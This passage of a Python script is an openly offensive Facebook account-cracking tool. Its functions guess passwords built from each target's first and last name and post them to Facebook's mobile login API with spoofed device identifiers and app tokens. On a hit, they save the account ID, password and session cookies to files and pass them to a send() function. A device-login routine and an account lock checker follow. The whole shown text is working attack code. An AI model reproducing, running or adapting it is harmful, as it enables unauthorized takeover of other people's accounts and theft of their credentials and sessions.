            elif "The action attempted has been deemed abusive or is otherwise disallowed" in po["error"]["message"]:
                
                sys.stdout.write(f"\r{loop}|{tl}; \033[1;31mSPAM|M1| OK: {len(oks)}\r");sys.stdout.flush()
            
            else:
                continue
        loop+=1
    
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        print(e)
        #m2(ids,names,passlist)
def m3(ids,names,passlist,tl):
    try:
        global oks,loop
        sys.stdout.write(f"\r{loop}|{tl}; XERX|M3| OK: {len(oks)} \r");sys.stdout.flush()
        fn = names.split(' ')[0]
        loop+=1
        r = requests.Session()
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            data= {'adid': adid, 'format': 'json', 'device_id': str(uuid.uuid4()), 'family_device_id': str(uuid.uuid4()), 'secure_family_device_id': str(uuid.uuid4()), 'cpl': 'true', 'try_num': '1', 'email': ids, 'password': pas, 'method': 'auth.login', 'generate_session_cookies': '1', 'sim_serials': "['80973453345210784798']", 'openid_flow': 'android_login', 'openid_provider': 'google', 'openid_emails': "['01710940017']", 'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']", 'error_detail_type': 'button_with_disabled', 'source': 'account_recovery', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
            head = {'User-Agent': m3file(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Host': 'graph.facebook.com', 'Content-Type': 'application/x-www-form-urlencoded', 'Priority': 'u=3, i', 'X-Fb-Sim-Hni': '45204', 'X-Fb-Net-Hni': '45201', 'X-Fb-Connection-Quality': 'GOOD', 'Zero-Rated': '0', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-Fb-Connection-Bandwidth': '24807555', 'X-Fb-Connection-Type': 'MOBILE.LTE', 'X-Fb-Device-Group': '5120', 'X-Tigon-Is-Retry': 'False', 'X-Fb-Friendly-Name': 'authenticate', 'X-Fb-Request-Analytics-Tags': 'unknown', 'X-Fb-Http-Engine': 'Liger', 'X-Fb-Client-Ip': 'True', 'X-Fb-Server-Cluster': 'True', 'Content-Length': '1676'}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data, headers=head,allow_redirects=False).json()
            if 'session_key' in po:
                uid = po['uid']
                print(f'\033[1;32m [OK-Xerx] {uid} | {pas} \033[0;m')
                session = po['session_cookies']
                datr = session[3]['name']+'='+session[3]['value']
                cookie = "; ".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_")
                savec = f'sb={sb};{cookie}'
                newck = ConvertCookie(savec,datr)
                open('/sdcard/m3-ok.txt', 'a').write(f'{uid}|{pas}\n')
                open('/sdcard/m3-ok_with_cookies.txt', 'a').write(f'{uid}|{pas}|{newck}\n')
                allx = f'{uid}|{pas}|{newck}'
                send(allx)
                oks.append(uid)
                if 'y' in ldd:
                    print(f' [COOKIE] {newck}')
                if 'y' in apc:
                    check(r,newck)
                
                break
            elif 'www.facebook.com' in po['error']['message']:
                if 'y' in okcp:
                    print(f'\033[1;31m [CP-Xerx] {ids} | {pas} \033[0;m')
                cps.append(ids)
                break
            elif 'two_factor' in str(po):
                if 'y' in okcp:
                    print(f'\033[1;36m [2F-Xerx] {ids} | {pas} \033[0;m')
                break
            elif "The action attempted has been deemed abusive or is otherwise disallowed" in po["error"]["message"]:
                
                sys.stdout.write(f"\r{loop}|{tl}; \033[1;31mSPAM|M1| OK: {len(oks)}\r");sys.stdout.flush()
            
            else:
                continue
        loop+=1
    
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        print(e)
        #m3(ids,names,passlist)
def m4(ids,names,passlist,tl):
    try:
        global oks,loop
        sys.stdout.write(f"\r{loop}|{tl}; XERX|M4| OK: {len(oks)} \r");sys.stdout.flush()
        fn = names.split(' ')[0]
        loop+=1
        r = requests.Session()
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            data= {'adid':str(adid), 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': family, 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '62f8ce9f74b12f84c123cc23437a4a32', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head = {'User-Agent': m4file(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '26849', 'X-FB-SIM-HNI': '22905', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data, headers=head,allow_redirects=False).json()
            if 'session_key' in po:
                uid = po['uid']
                print(f'\033[1;32m [OK-Xerx] {uid} | {pas} \033[0;m')
                session = po['session_cookies']
                datr = session[3]['name']+'='+session[3]['value']
                cookie = "; ".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_")
                savec = f'sb={sb};{cookie}'
                newck = ConvertCookie(savec,datr)
                open('/sdcard/m4-ok.txt', 'a').write(f'{uid}|{pas}\n')
                open('/sdcard/m4-ok_with_cookies.txt', 'a').write(f'{uid}|{pas}|{newck}\n')
                allx = f'{uid}|{pas}|{newck}'
                send(allx)
                oks.append(uid)
                if 'y' in ldd:
                    print(f' [COOKIE] {newck}')
                if 'y' in apc:
                    check(r,newck)
                
                break
            elif 'www.facebook.com' in po['error']['message']:
                if 'y' in okcp:
                    print(f'\033[1;31m [CP-Xerx] {ids} | {pas} \033[0;m')
                cps.append(ids)
                break
            elif 'two_factor' in str(po):
                if 'y' in okcp:
                    print(f'\033[1;36m [2F-Xerx] {ids} | {pas} \033[0;m')
                break
            elif "The action attempted has been deemed abusive or is otherwise disallowed" in po["error"]["message"]:
                
                sys.stdout.write(f"\r{loop}|{tl}; \033[1;31mSPAM|M1| OK: {len(oks)}\r");sys.stdout.flush()
            
            else:
                continue
        loop+=1
    
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        print(e)

def m5(ids,names,passlist,tl):
    try:
        global oks,loop
        sys.stdout.write(f"\r{loop}|{tl}; XERX|M5| OK: {len(oks)} \r");sys.stdout.flush()
        fn = names.split(' ')[0]
        loop+=1
        r = requests.Session()
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            data= {'adid': str(adid), 'method': 'POST', 'format': 'json', 'device_id': device_id, 'family_device_id': family, 'secure_family_device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'cpl': 'true', 'credentials_type': 'password', 'generate_session_cookies': '1', 'error_detail_type': 'button_with_disabled', 'generate_machine_id': '1', 'locale': 'en_GB', 'client_country_code': 'GB', 'omit_response_on_success': 'false', 'enroll_misauth': 'false', 'advertising_id': str(uuid.uuid4()), 'encrypted_msisdn': '', 'fb_api_req_friendly_name': 'authenticate'}
            head = {'Host': 'graph.facebook.com', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-connection-bandwidth': '29920503', 'x-fb-net-hni': '34528', 'x-fb-sim-hni': '38333', 'Zero-Rated': '0', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'MOBILE.LTE', 'user-agent': m5file(), 'content-type': 'app_authlication/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger', 'x-fb-client-IP': 'True', 'x-fb-server-cluster': 'Keep-Alive', 'Content-Type': 'application/json'}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data, headers=head,allow_redirects=False).json()
            if 'session_key' in po:
                uid = po['uid']
                print(f'\033[1;32m [OK-Xerx] {uid} | {pas} \033[0;m')
                session = po['session_cookies']
                datr = session[3]['name']+'='+session[3]['value']
                cookie = "; ".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_")
                savec = f'sb={sb};{cookie}'
                newck = ConvertCookie(savec,datr)
                open('/sdcard/m4-ok.txt', 'a').write(f'{uid}|{pas}\n')
                open('/sdcard/m4-ok_with_cookies.txt', 'a').write(f'{uid}|{pas}|{newck}\n')
                allx = f'{uid}|{pas}|{newck}'
                send(allx)
                oks.append(uid)
                if 'y' in ldd:
                    print(f' [COOKIE] {newck}')
                if 'y' in apc:
                    check(r,newck)
                
                break
            elif 'www.facebook.com' in po['error']['message']:
                if 'y' in okcp:
                    print(f'\033[1;31m [CP-Xerx] {ids} | {pas} \033[0;m')
                cps.append(ids)
                break
            elif 'two_factor' in str(po):
                if 'y' in okcp:
                    print(f'\033[1;36m [2F-Xerx] {ids} | {pas} \033[0;m')
                break
            elif "The action attempted has been deemed abusive or is otherwise disallowed" in po["error"]["message"]:
                
                sys.stdout.write(f"\r{loop}|{tl}; \033[1;31mSPAM|M1| OK: {len(oks)}\r");sys.stdout.flush()
            
            else:
                continue
        loop+=1
    
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        print(e)

def country():
    logo()
    global mthd
    print(' [1] nepal random')
    print(' [2] india random')
    
    print(61*'-')
    user = input(' Select option: ')
    if user == '1':
        mthd.update({"cc": "np"})
        
    elif user == '2':
        mthd.update({"cc": "in"})
    
    else:
        print(' invalid option');time.sleep(2);country()
def login():
    r = requests.Session() 
    logo()
    print(' Suggestion Use New Id For Login ! ')
    print(61 * '-')
    cookie = input(' cookie : ')
    try:
        r1 = r.get('https://graph.facebook.com/v18.0/device/login/?method=POST&access_token=1174099472704185|0722a7d5b5a4ac06b11450f7114eb2e9').json()
        f1 = re.search(r'<form method="post"(.*?)</form>',str(r.get('https://mbasic.facebook.com/device', cookies={'cookie':cookie}).text.replace('\\','').replace('amp;',''))).group(1)
        p1 = r.post('https://mbasic.facebook.com'+re.search(r'action="(.*?)"',str(f1)).group(1), data={**{i[0]:i[1] for i in re.findall(r'name="(.*?)" value="(.*?)"',str(f1))}, **{'user_code':r1['user_code']}}, cookies={'cookie':cookie}).text.replace('\\','').replace('amp;','')
        f2 = re.search(r'<form method="post"(.*?)</form>',str(p1)).group(1)
        p2 = r.post('https://mbasic.facebook.com'+re.search(r'action="(.*?)"',str(f2)).group(1), data={'fb_dtsg':re.search(r'name="fb_dtsg" value="(.*?)"',str(f2)).group(1), 'jazoest':re.search(r'name="jazoest" value="(.*?)"',str(f2)).group(1), 'scope':re.search(r'name="scope" value="(.*?)"',str(f2)).group(1), 'display':re.search(r'name="display" value="(.*?)"',str(f2)).group(1), 'user_code':re.search(r'name="user_code" value="(.*?)"',str(f2)).group(1), 'logger_id':re.search(r'name="logger_id" value="(.*?)"',str(f2)).group(1), 'auth_type':re.search(r'name="auth_type" value="(.*?)"',str(f2)).group(1), 'encrypted_post_body':re.search(r'name="encrypted_post_body" value="(.*?)"',str(f2)).group(1), 'return_format[]':re.search(r'name="return_format\[\]" value="(.*?)"',str(f2)).group(1), 'sdk':'', 'sdk_version':'', 'domain':'', 'sso_device':'', 'state':'', 'auth_nonce':'', 'code_challenge':'', 'code_challenge_method':''}, cookies={'cookie':cookie}).text.replace('\\','').replace('amp;','')
        r3 = r.get('https://graph.facebook.com/v18.0/device/login_status?method=post&code={}&access_token=1174099472704185|0722a7d5b5a4ac06b11450f7114eb2e9'.format(r1['code'])).json()
        return(r3)
        print(r3)
    except Exception as e:
        print(e)
from bs4 import BeautifulSoup as bxx
#-------checker------#
def lock_check(uid):
    sessionx=requests.Session()
    urlx=f'https://www.facebook.com/p/{uid}'
    req=bxx(sessionx.get(urlx).content,'html.parser')
    tx=req.find('title').text
    if tx =='Facebook':
        return('LOCK')
    else:
        return('LIVE')
main()

